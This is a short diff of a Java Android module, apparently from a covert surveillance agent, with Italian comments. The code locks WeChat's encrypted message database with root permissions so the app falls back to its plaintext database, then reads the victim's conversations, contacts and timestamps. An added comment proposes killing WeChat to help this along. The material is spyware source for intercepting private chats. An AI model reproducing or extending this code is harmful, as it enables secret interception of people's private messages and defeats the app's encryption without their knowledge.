@@ -80,6 +80,8 @@ public class ChatWeChat extends SubModuleChat {
 	 * Apre msgstore.db, estrae le conversazioni. Per ogni conversazione legge i
 	 * messaggi relativi
 	 * 
+	 * Se wechat non puo' scrivere nel db cifrato, switcha su quello in chiaro
+	 * 
 	 * @throws IOException
 	 */
 	private void readChatWeChatMessages() {
@@ -97,7 +99,9 @@ public class ChatWeChat extends SubModuleChat {
 
 		try {
 			boolean updateMarkup = false;
+			// cifrato
 			String dbEncFile = "EnMicroMsg.db";
+			// in chiaro
 			String dbFile = "MicroMsg.db";
 			String dbDir = "";
 
@@ -139,7 +143,8 @@ public class ChatWeChat extends SubModuleChat {
 
 			// chmod 000, chown root:root
 			Path.lock(dbDir + dbEncFile);
-
+			
+			// TODO: si potrebbe killare wechat
 			if (Path.unprotect(dbDir, dbFile, true)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages): can read DB");
@@ -201,6 +206,7 @@ public class ChatWeChat extends SubModuleChat {
 			@Override
 			public long cursor(Cursor cursor) {
 				long createTime = cursor.getLong(0);
+				// localtime or gmt? should be converted to gmt
 				Date date = new Date(createTime);
 				String talker = cursor.getString(1);
 				int isSend = cursor.getInt(2);
